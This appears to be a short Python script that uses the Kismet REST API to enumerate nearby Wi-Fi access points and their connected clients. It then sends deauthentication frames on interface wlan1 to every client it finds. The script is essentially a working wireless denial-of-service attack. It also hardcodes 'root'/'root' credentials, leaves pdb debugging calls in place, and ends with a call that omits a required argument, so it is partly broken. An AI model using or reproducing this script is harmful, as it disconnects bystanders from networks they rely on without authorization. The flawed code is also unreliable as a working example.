import kismet_rest
import deauthenticator
import pdb

class Devices():
    device = None

    def __init__(self):
        self.device = kismet_rest.Devices()
        self.device.set_login("root", "root")

    def get_access_points(self):
        for ap in self.device.dot11_access_points():
            self.clients(ap)

    def clients(self, access_point):
        ap_mac_addr = access_point['kismet.device.base.macaddr']
        for client in self.device.dot11_clients_of(access_point['kismet.device.base.key']):
            client_mac = client['kismet.device.base.macaddr']
            resp = deauthenticator.deauth("wlan1", 1, ap_mac_addr, client_mac)
            print(client)


    def devices(self):
        for device in self.device.all():
            pdb.set_trace()

def go():
    mssgs = kismet_rest.Messages()
    mssgs.set_login("root", "root")
    
    
    msgs = mssgs.all()
    for msg in msgs:
        pdb.set_trace()

if __name__ == "__main__":
    devices = Devices()
    devices.get_access_points()
    devices.clients()
